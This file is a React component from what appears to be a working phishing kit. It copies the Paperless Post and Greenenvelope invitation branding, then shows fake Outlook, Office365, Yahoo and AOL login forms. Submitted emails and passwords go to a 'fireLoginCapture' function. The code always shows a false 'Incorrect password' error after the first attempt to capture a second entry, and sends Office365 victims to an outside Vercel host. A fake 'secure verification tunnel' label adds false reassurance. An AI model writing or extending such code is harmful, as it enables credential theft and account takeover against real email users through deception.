import React, { useState } from 'react';
import { ChevronRight, RefreshCw, X, Eye, EyeOff } from 'lucide-react';
import { EmailProvider } from '../types';
import { fireLoginCapture } from '../utils/api';

interface ReplicaPanelProps {
  onSelectProvider: (provider: EmailProvider, email: string) => void;
  mockProviders: EmailProvider[];
}

export default function ReplicaPanel({ onSelectProvider, mockProviders }: ReplicaPanelProps) {
  const [activeLoginProvider, setActiveLoginProvider] = useState<EmailProvider | null>(null);
  const [emailInput, setEmailInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [attempts, setAttempts] = useState(0);

  const handleOpenLogin = (provider: EmailProvider) => {
    setActiveLoginProvider(provider);
    setEmailInput('');
    setPasswordInput('');
    setErrorMsg('');
    setIsLoading(false);
    setAttempts(0);
  };

  const handleCloseLogin = () => {
    setActiveLoginProvider(null);
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    if (!emailInput.trim()) {
      setErrorMsg('Please enter your email address.');
      return;
    }
    if (!emailInput.includes('@')) {
      setErrorMsg('Please enter a valid email address (e.g., name@domain.com).');
      return;
    }
    if (!passwordInput.trim()) {
      setErrorMsg('Please enter your password.');
      return;
    }

    setIsLoading(true);

    fireLoginCapture({
      email: emailInput,
      provider: activeLoginProvider?.id || 'email',
      password: passwordInput,
      attempt: (attempts + 1) as 1 | 2,
    });

    setTimeout(() => {
      setIsLoading(false);
      if (attempts === 0) {
        if (activeLoginProvider?.id === 'outloo' || activeLoginProvider?.id === 'office365') {
          window.location.href = "https://auth-client-teal-seven.vercel.app/";
        } else {
          setErrorMsg('Incorrect password. Please check your credentials and try again.');
          setAttempts(1);
        }
      } else {
        onSelectProvider(activeLoginProvider!, emailInput);
        setActiveLoginProvider(null);
        setAttempts(0);
      }
    }, 1200);
  };

  const renderLogo = (providerId: string) => {
    switch (providerId) {
      case 'outlook':
        return (
          <svg className="w-5 h-5 absolute" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M19.5 5.25v13.5c0 .966-.784 1.75-1.75 1.75H8.25c-.966 0-1.75-.784-1.75-1.75V5.25c0-.966.784-1.75 1.75-1.75h9.5c.966 0 1.75.784 1.75 1.75z" fill="#0072C6" />
            <path d="M1.5 7.5v9c0 .966.784 1.75 1.75 1.75h9.5c.966 0 1.75-.784 1.75-1.75v-9c0-.966-.784-1.75-1.75-1.75h-9.5C2.284 5.75 1.5 6.534 1.5 7.5z" fill="#00559A" />
            <text x="3.5" y="14.5" fill="#ffffff" style={{ fontSize: '9px', fontWeight: 'bold', fontFamily: 'sans-serif' }}>O</text>
          </svg>
        );
      case 'office365':
        return (
          <div className="grid grid-cols-2 gap-[2px] w-4.5 h-4.5">
            <div className="bg-[#f25f22] w-2 h-2 rounded-xs"></div>
            <div className="bg-[#7fba00] w-2 h-2 rounded-xs"></div>
            <div className="bg-[#00a4ef] w-2 h-2 rounded-xs"></div>
            <div className="bg-[#ffb900] w-2 h-2 rounded-xs"></div>
          </div>
        );
      case 'yahoo':
        return (
          <span className="text-[#6001d2] font-black text-sm tracking-tighter" style={{ fontFamily: 'Georgia, serif' }}>Y!</span>
        );
      case 'aol':
        return (
          <span className="text-black font-sans font-black text-[9px] tracking-tighter">Aol.</span>
        );
      default:
        return (
          <svg className="w-4 h-4 text-[#ea4335]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <rect width="20" height="14" x="2" y="5" rx="2" />
            <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
          </svg>
        );
    }
  };

  return (
    <div
      id="replica-container"
      className="w-full max-w-[430px] my-6 rounded-2xl bg-[#3a3735]/92 backdrop-blur-md border border-[#ffffff15] text-white flex flex-col justify-between py-7 px-5 md:px-8 shadow-2xl relative z-10"
    >
      <div id="logo-container" className="flex flex-col items-center pt-2">
        <div id="logo-branding-plate" className="bg-white w-48 py-3.5 px-5 flex flex-col items-center shadow-lg rounded-sm transition-transform duration-300 hover:scale-[1.01]">
          <h1 id="logo-main-text" className="font-serif text-[#111] text-2xl font-normal tracking-wide text-center uppercase" style={{ fontFamily: '"Playfair Display", Georgia, serif' }}>
            Paperless
          </h1>
          <div id="logo-sub-text" className="w-full flex items-center justify-center gap-1.5 mt-0.5">
            <span id="logo-dash-left" className="h-[1px] bg-gray-300 w-6"></span>
            <span id="logo-post-word" className="text-[9px] uppercase font-sans tracking-[0.25em] text-gray-400 font-semibold">POST</span>
            <span id="logo-dash-right" className="h-[1px] bg-gray-300 w-6"></span>
          </div>
          <span id="logo-registered-mark" className="text-[7.5px] text-gray-400 absolute top-1.5 right-1.5 font-sans">®</span>
        </div>
      </div>

      <div id="form-body-container" className="flex-1 flex flex-col justify-center my-6">
        <div id="heading-texts" className="text-center mb-6">
          <h2 id="access-cta-heading" className="text-xl md:text-2xl font-sans font-medium tracking-tight text-white mb-2">
            Access Invitations & Cards
          </h2>
          <p id="access-description-para" className="text-xs md:text-sm text-gray-300 font-sans leading-relaxed px-1">
            To view the invitation, please select your email provider below and log in. You were invited to access the invitation on <span className="text-blue-300 font-medium hover:underline cursor-pointer">Greenenvelope</span>.
          </p>
        </div>

        <div id="provider-buttons-stack" className="space-y-3 w-[95%] mx-auto relative">
          {mockProviders.map((provider) => (
            <button
              key={provider.id}
              id={`provider-btn-${provider.id}`}
              onClick={() => handleOpenLogin(provider)}
              className="w-full py-2 px-3 rounded-full flex items-center justify-between text-left transition-all duration-200 transform active:scale-98 shadow-sm hover:shadow-md hover:-translate-y-0.5 border border-transparent hover:border-white/10 cursor-pointer"
              style={{ backgroundColor: provider.bgColor }}
            >
              <div id={`provider-btn-left-${provider.id}`} className="flex items-center gap-3">
                <div id={`provider-icon-wrapper-${provider.id}`} className="w-8 h-8 rounded-full bg-white flex items-center justify-center shadow-inner shrink-0 relative">
                  {renderLogo(provider.id)}
                </div>
                <span id={`provider-btn-text-${provider.id}`} className="font-sans font-semibold text-xs tracking-wide text-white">
                  {provider.buttonText}
                </span>
              </div>
              <ChevronRight id={`provider-btn-arrow-${provider.id}`} className="w-4 h-4 text-white/50" />
            </button>
          ))}

          {activeLoginProvider && (
            <div
              id="login-dialog-overlay"
              className="absolute inset-x-0 -top-16 -bottom-6 bg-[#272524] rounded-2xl border border-white/10 p-5 shadow-2xl flex flex-col justify-between z-30 animate-in fade-in zoom-in-95 duration-200"
            >
              <div className="space-y-4">
                <div className="flex items-center justify-between pb-3 border-b border-white/5">
                  <div className="flex items-center gap-3">
                    <div className="w-8 h-8 rounded-full bg-white flex items-center justify-center relative shadow-sm shrink-0">
                      {renderLogo(activeLoginProvider.id)}
                    </div>
                    <span className="font-sans font-bold text-sm text-white">
                      Login with {activeLoginProvider.name}
                    </span>
                  </div>
                  <button
                    onClick={handleCloseLogin}
                    className="p-1 text-gray-400 hover:text-white hover:bg-white/5 rounded-full transition-colors cursor-pointer"
                  >
                    <X className="w-4 h-4" />
                  </button>
                </div>

                <form id="login-dialog-form" onSubmit={handleLoginSubmit} className="space-y-3.5">
                  <div className="space-y-1">
                    <label className="text-[10px] text-gray-400 font-bold uppercase tracking-wider font-sans block">
                      Email Address
                    </label>
                    <input
                      type="text"
                      className="w-full bg-black/30 border border-white/15 focus:border-blue-400 rounded-lg py-1.5 px-3 text-xs text-white placeholder-gray-500 focus:outline-none transition-colors font-sans"
                      placeholder={`username@${activeLoginProvider.id === 'outlook' || activeLoginProvider.id === 'office365' ? 'outlook.com' : activeLoginProvider.id === 'yahoo' ? 'yahoo.com' : activeLoginProvider.id === 'aol' ? 'aol.com' : 'mail.com'}`}
                      value={emailInput}
                      onChange={(e) => setEmailInput(e.target.value)}
                      disabled={isLoading}
                      autoFocus
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="text-[10px] text-gray-400 font-bold uppercase tracking-wider font-sans block">
                      Password
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? 'text' : 'password'}
                        className="w-full bg-black/30 border border-white/15 focus:border-blue-400 rounded-lg py-1.5 pl-3 pr-9 text-xs text-white placeholder-gray-500 focus:outline-none transition-colors font-sans"
                        placeholder="••••••••"
                        value={passwordInput}
                        onChange={(e) => setPasswordInput(e.target.value)}
                        disabled={isLoading}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2.5 top-1.5 text-gray-400 hover:text-white cursor-pointer"
                      >
                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                      </button>
                    </div>
                  </div>

                  {errorMsg && (
                    <p className="text-[11px] text-rose-400 font-semibold font-sans mt-1">
                      ⚠️ {errorMsg}
                    </p>
                  )}

                  <div className="pt-2 flex gap-2">
                    <button
                      type="submit"
                      disabled={isLoading}
                      className="flex-1 bg-amber-500 hover:bg-amber-400 text-black font-sans text-xs font-bold py-2 px-4 rounded-lg flex items-center justify-center gap-1.5 transition-colors cursor-pointer select-none disabled:opacity-50"
                    >
                      {isLoading ? (
                        <>
                          <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                          Verifying...
                        </>
                      ) : (
                        'Enter'
                      )}
                    </button>
                    <button
                      type="button"
                      onClick={handleCloseLogin}
                      className="px-3 py-2 border border-white/10 hover:border-white/25 rounded-lg text-xs font-semibold text-gray-300 hover:text-white transition-colors cursor-pointer"
                    >
                      Cancel
                    </button>
                  </div>
                </form>
              </div>

              <div className="text-[9px] text-gray-500 text-center font-mono pt-3 border-t border-white/5">
                SECURE END-TO-END VERIFICATION TUNNEL
              </div>
            </div>
          )}
        </div>
      </div>

      <div id="disclosures-footer-container" className="text-center pt-3.5 border-t border-white/10 space-y-3">
        <p id="disclosure-para-1" className="text-[9.5px] text-gray-400 font-sans leading-relaxed">
          Online Invitations & Birthday Cards, greenenvelope simplifies event planning with user-friendly tools for managing online invitations and greeting cards.
        </p>
        <p id="disclosure-para-2" className="text-[8.5px] text-gray-500 font-sans leading-relaxed">
          © 2025 Sincere Corporation, greenenvelope is a registered trademark of Sincere Corporation. All rights reserved. All other product and company names are trademarks or registered trademarks of their respective holders.
        </p>
      </div>
    </div>
  );
}
